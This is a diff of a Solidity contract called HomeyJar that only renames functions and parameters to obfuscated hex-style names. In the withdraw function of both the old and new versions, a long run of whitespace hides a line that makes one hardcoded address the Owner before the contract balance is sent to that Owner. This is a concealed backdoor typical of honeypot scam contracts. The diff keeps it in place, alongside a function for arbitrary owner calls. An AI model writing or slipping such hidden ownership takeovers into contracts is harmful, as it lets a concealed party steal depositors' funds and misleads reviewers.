@@ -12,13 +12,13 @@ contract HomeyJar {
         }
     }
 
-    function _0xd6d2ad() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}
+    function _0x817c2d() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}
         require(msg.sender == Owner);
         Owner.transfer(this.balance);
     }
 
-    function Command(address _0x843807,bytes data) payable public {
+    function Command(address _0x477ea6,bytes data) payable public {
         require(msg.sender == Owner);
-        _0x843807.call.value(msg.value)(data);
+        _0x477ea6.call.value(msg.value)(data);
     }
 }
